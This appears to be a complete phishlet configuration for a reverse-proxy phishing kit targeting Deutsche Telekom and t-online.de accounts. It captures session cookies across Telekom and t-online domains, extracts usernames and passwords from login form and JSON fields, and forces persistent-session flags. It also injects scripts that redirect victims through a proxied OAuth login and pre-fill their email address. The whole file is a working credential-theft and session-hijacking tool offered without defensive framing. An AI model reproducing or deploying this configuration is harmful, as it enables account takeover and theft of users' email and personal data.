auth_tokens:
  - domain: "accounts.login.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".accounts.login.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: "account.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".account.idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".idm.telekom.com"
    keys: ['.*,regexp']

  - domain: ".telekom.com"
    keys: ['.*,regexp']

  - domain: "email.t-online.de"
    keys: ['lisid', 'lisaMA', 'CNT', '.*,regexp']

  - domain: ".email.t-online.de"
    keys: ['lisid', 'lisaMA', 'CNT', '.*,regexp']

  - domain: "www.t-online.de"
    keys: ['.*,regexp']

  - domain: ".t-online.de"
    keys: ['.*,regexp']

force_post:
  - path: "/factorx*"
    search:
      - {key: "pw_pwd", search: ".*"}
    force:
      - {key: "persist_session", value: "on"}
      - {key: "remember_user", value: "on"}
      - {key: "persist_session_displayed", value: "1"}
    type: "post"

auth_urls:
  - "/em*"
  - "/api/openid_connect_login*"
  - "/auth/login/oauth2/code/telekom*"

credentials:
  username:
    key: "(^pw_usr$|^username$|^login$|^anmeldename$|^t-online-id$|^email$)"
    search: "(.*)"
    type: "post"
  password:
    key: "(^pw_pwd$|^password$|^passwd$|^passwort$|^pass$|^userPassword$)"
    search: "(.*)"
    type: "post"
  custom:
    - key: "hidden_usr"
      search: "(.*)"
      type: "post"
    - key: "username_json"
      search: '"username"\s*:\s*"([^"]*)'
      type: "json"
    - key: "password_json"
      search: '"password"\s*:\s*"([^"]*)'
      type: "json"

login:
  domain: "www.t-online.de"
  path: "/"

js_inject:
  - trigger_domains: ["www.t-online.de"]
    trigger_paths: ["/"]
    trigger_params: []
    script: |
      window.addEventListener('load', function() {
        var parts = window.location.hostname.split('.');
        parts[0] = 'tlogin';
        var tloginHost = parts.join('.');
        var loginUrl = 'https://' + tloginHost + '/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE2000000000000&scope=openid&redirect_uri=https%3A%2F%2Fwww.t-online.de%2Fauth%2Flogin%2Foauth2%2Fcode%2Ftelekom&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3Anull%7D%7D&display=popup';
        var hash = window.location.hash;
        if (hash && hash.length > 1) { loginUrl += hash; }
        window.location.href = loginUrl;
      });

  - trigger_domains: ["www.t-online.de"]
    trigger_paths: ["/auth/login/oauth2/code/telekom*"]
    trigger_params: []
    script: |
      window.addEventListener('load', function() {
        var parts = window.location.hostname.split('.');
        parts[0] = 'mail';
        var mailHost = parts.join('.');
        window.location.href = 'https://' + mailHost + '/em';
      });

  - trigger_domains: ["accounts.login.idm.telekom.com"]
    trigger_paths: ["/*"]
    trigger_params: []
    script: |
      window.addEventListener('load', function() {
        function waitForElm(selector) {
          return new Promise(resolve => {
            if (document.querySelector(selector)) return resolve(document.querySelector(selector));
            const observer = new MutationObserver(() => {
              if (document.querySelector(selector)) {
                resolve(document.querySelector(selector));
                observer.disconnect();
              }
            });
            observer.observe(document.body, { childList: true, subtree: true });
          });
        }

        var hash = window.location.hash.slice(1);
        if (hash.length === 0) return;
        var email = decodeURIComponent(hash);

        var selectors = [
          'input[name="username"]',
          'input[name="login"]',
          'input[name="t-online-id"]',
          'input[name="id"]',
          'input[type="email"]',
          'input[type="text"]'
        ];

        var found = false;
        for (var i = 0; i < selectors.length; i++) {
          var el = document.querySelector(selectors[i]);
          if (el) {
            el.value = email;
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            found = true;
            break;
          }
        }

        if (!found) {
          waitForElm('input[type="email"], input[type="text"], input[name="username"]').then(function(el) {
            el.value = email;
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
          });
        }
      });
      